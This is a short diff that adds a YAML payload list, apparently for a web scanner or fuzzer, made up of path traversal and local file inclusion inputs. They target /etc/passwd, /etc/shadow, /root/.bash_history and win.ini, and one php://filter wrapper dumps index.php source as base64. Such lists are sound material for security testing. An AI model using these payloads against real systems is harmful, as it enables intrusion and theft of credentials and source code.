@@ -1,0 +1,9 @@
+payloads:
+  - "/etc/passwd"
+  - "../../../../../../../../../etc/passwd"
+  - "/windows/win.ini"
+  - "../../../../../../../../../windows/win.ini"
+  - "C:\\windows\\win.ini"
+  - "/etc/shadow"
+  - "/root/.bash_history"
+  - "php://filter/convert.base64-encode/resource=index.php"
